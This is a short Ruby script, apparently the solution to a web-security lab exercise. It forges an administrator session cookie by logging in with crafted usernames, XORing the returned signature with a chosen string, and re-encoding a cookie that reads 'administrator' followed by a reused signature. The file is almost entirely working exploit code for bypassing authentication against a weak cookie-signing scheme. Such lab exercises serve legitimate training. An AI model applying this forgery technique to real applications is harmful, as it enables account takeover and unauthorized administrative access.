require 'httparty'
require 'base64'

URL = "" # your lab url

def login(username)
  res = HTTParty.post(URL + "/login.php", body: {username: username, password: 'Password1'}, follow_redirects: false)
  return res.headers["set-cookie"].split("=")[1]
end

def xor(str1, str2)
  ret = ""
  str1.split(//).each_with_index do |c, i|
    ret[i] = (str1[i].ord ^ str2[i].ord).chr
  end
  return ret
end

cookie = login("administ")
sig1 = Base64.decode64(cookie).split("--")[1]

user2 = xor("rator\00\00\00", sig1)
cookie2 = login(user2).gsub("%2B","+")
puts cookie2
sig2 = Base64.decode64(cookie2).split("--")[1]
puts sig2
puts Base64.encode64("administrator--#{sig2}")
